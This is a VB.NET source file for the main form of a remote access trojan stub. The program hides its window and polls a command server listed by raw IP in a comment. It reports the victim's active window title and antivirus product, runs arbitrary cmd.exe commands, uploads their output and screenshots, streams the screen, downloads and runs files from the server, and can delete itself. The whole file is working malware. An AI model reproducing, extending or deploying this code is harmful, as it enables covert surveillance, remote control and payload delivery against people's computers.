Imports System.Text
Imports System.Net
Imports System.Threading
Imports System.Net.NetworkInformation
Imports System.IO
Imports System.Management

''' <summary>
''' TODO: Add mutex
''' </summary>

Public Class MainForm
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer

    Private Function GetCaption() As String
        Dim Caption As New StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function

    Public EOFArguments As String()
    Public mainWebClient As WebClient = New WebClient()
    Public upTime As Integer = 0

    Public Shared Function GetAntivirus() As String
        Try
            Dim Name As String = String.Empty
            Dim WinDefend As Boolean = False
            Dim Path As String = "\\" & Environment.MachineName & "\root\SecurityCenter2"

            Using MOS As ManagementObjectSearcher = New ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct")

                For Each Instance In MOS.[Get]()
                    If Instance.GetPropertyValue("displayName").ToString() = "Windows Defender" Then WinDefend = True
                    If Instance.GetPropertyValue("displayName").ToString() <> "Windows Defender" Then Name = Instance.GetPropertyValue("displayName").ToString()
                Next

                If Name = String.Empty AndAlso WinDefend Then Name = "Windows Defender"
                If Name = "" Then Name = "N/A"
                Return Name
            End Using

        Catch
            Return "N/A"
        End Try
    End Function

    Public Function GetGBRamAmount() As String
        Return Convert.ToInt32(My.Computer.Info.AvailablePhysicalMemory / My.Computer.Info.TotalPhysicalMemory).ToString("p")
    End Function
    Public Function GetPing() As Integer
        Dim latency As String = ""

        Try
            Dim address As IPAddress = Dns.GetHostAddresses(New Uri(EOFArguments(0) & "clients.php?action=writeme").Host)(0)
            latency = New Ping().Send(address).RoundtripTime.ToString()
        Catch Ex As Exception
            latency = "Unknown Error"
        End Try

        Return latency
    End Function
    Public Function GetExeName() As String
        Dim exename As String
        exename = AppDomain.CurrentDomain.FriendlyName
        Return exename
    End Function
    Public Function ShellRun(sCmd As String) As String
        Dim oShell As Object = CreateObject("WScript.Shell")

        Dim oExec As Object = oShell.Exec(sCmd)
        Dim oOutput As Object = oExec.StdOut
        Dim s As String = ""
        Dim sLine As String = ""

        While Not oOutput.AtEndOfStream
            sLine = oOutput.ReadLine
            If sLine <> "" Then s &= sLine & vbCrLf
        End While

        Return s
    End Function
    Public Function APIRequest() As String
        Dim cpuCounter As PerformanceCounter = New PerformanceCounter("Processor", "% Processor Time", "_Total")
        Dim GetCPU As String = String.Format("{0:f0}", Convert.ToSingle(cpuCounter.NextValue()))

        Dim apiResponse As String = New WebClient().DownloadString(EOFArguments(0) &
        "clients.php?action=writeme&ping=" & GetPing() &
        "&ram=" & GetGBRamAmount() &
        "&cpu=" & GetCPU &
        "&currentwindow=" & GetCaption() &
        "&uptime=" & upTime &
        "&softwarename=" & GetExeName() &
        "&avname=" & GetAntivirus()
        )

        upTime += 1
        Return apiResponse
    End Function
    Private Sub mainBW_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles mainBW.DoWork
        While True
            Dim apiQuery As String = APIRequest()
            If apiQuery.Trim <> "" Then
                Dim parsedResponse As String() = apiQuery.Split("|")
                Dim actionType As String = parsedResponse(0)
                Dim actionContent As String() = parsedResponse.Skip(1).ToArray
                parseAction(actionType, actionContent)
            End If
            Thread.Sleep(500)
        End While
    End Sub

    'Private Sub DefineEOFArgVar(ByRef EOFArg As String())
    '   EOFArg = {"http://185.62.188.189/RAT/"}
    'End Sub

    Public Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        ' EOF arguments parsing |
        '                       v

        ' FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
        ' Dim Data As String = Space(LOF(1))
        ' FileGet(1, Data)
        ' FileClose(1)


        ' Only for debugging purposes. I don't want to put the raw ip of my vps on Github, so
        ' I put it in a file which the stub reads automatically.
        'EOFArguments = {"http://185.62.188.189/RAT/"} '{File.ReadAllText("C:\MeteorLogger\vpsurl.txt")}
        DefineEOFArgVar(EOFArguments)

        CheckForIllegalCrossThreadCalls = False
        mainBW.RunWorkerAsync()
        Me.Opacity = 0
        Me.Hide()
    End Sub

    Private Sub parseAction(actionType As String, actionContent As String())
        If actionType = "camerashot" Then
            ' Dim cap As New Capture() 'first line
            ' cap.Dispose()

            ' Dim client As New WebClient
            ' client.UploadData(EOFArguments(0) & "clients.php?action=uploadscreenshot&actioncontent=test.jpeg", cap.QueryFrame.ToImage)

        ElseIf actionType = "screenshare" Then
            If Screenshare.screenshareBW Is Nothing Then
                Screenshare.InitFluxManager()
            End If

            If actionContent(0) = "start" Then
                Screenshare.screenshareQuality = actionContent(1)
                Screenshare.screenshareFluxInterval = Convert.ToInt32(actionContent(2))

                If Not Screenshare.screenshareBW.IsBusy Then
                    Screenshare.screenshareBW.RunWorkerAsync()
                End If
            Else
                Screenshare.screenshareBW.CancelAsync()
            End If


        ElseIf actionType = "screenshot" Then
            Dim screenGrab As Bitmap = Screenshare.TakeBitmapScreenshot()
            Dim bmpBytes As Byte() = Screenshare.ResizeConvertBMP(screenGrab, 75L)
            mainWebClient.UploadData(EOFArguments(0) & "clients.php?action=uploadscreenshot&actioncontent=" + actionContent(0), bmpBytes)

        ElseIf actionType = "runwincmd" Then
            Dim shellReply As String
            shellReply = Convert.ToBase64String(Encoding.UTF8.GetBytes(ShellRun("cmd.exe /c " & actionContent(0))))
            mainWebClient.UploadString(EOFArguments(0), "clients.php?action=sendshellreply&actioncontent=" & shellReply)

        ElseIf actionType = "shutdownrat" Then
            Environment.Exit(1)

        ElseIf actionType = "rebootrat" Then
            Shell(Application.ExecutablePath)
            Environment.Exit(1)

        ElseIf actionType = "uninstallrat" Then
            Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 1 & Del " + Application.ExecutablePath)
            Environment.Exit(1)

        ElseIf actionType = "msgbox" Then
            MsgBox(actionContent(0),, "")

        ElseIf actionType = "openremotechat" Then
            Invoke(Sub() RemoteChat.Show())

        ElseIf actionType = "closeremotechat" Then
            Invoke(Sub() RemoteChat.Hide())


            '  ElseIf actionType = "raisePerm" Then
            '     Dim raiseperm As New Process()
            '       New raiseperm() With { .StartInfo = { .FileName = Application.ExecutablePath, .UseShellExecute = True, .Verb = "runas"} }.Start()
            '      Try
            '     Process.GetCurrentProcess().Kill()
            '    Catch
            '   Environment.[Exit](0)
            '  End Try

        ElseIf actionType = "camerashare" Then

        ElseIf actionType = "remotexec" Then
            Dim filename As String = actionContent(0)
            Dim client As New WebClient
            client.DownloadFile(EOFArguments(0) & "/files/" & filename, filename)
            Try
                File.Move(filename, Path.GetTempPath & filename)
                File.Delete(filename)
            Catch
            End Try
            Process.Start(Path.GetTempPath & filename)
        End If


    End Sub
End Class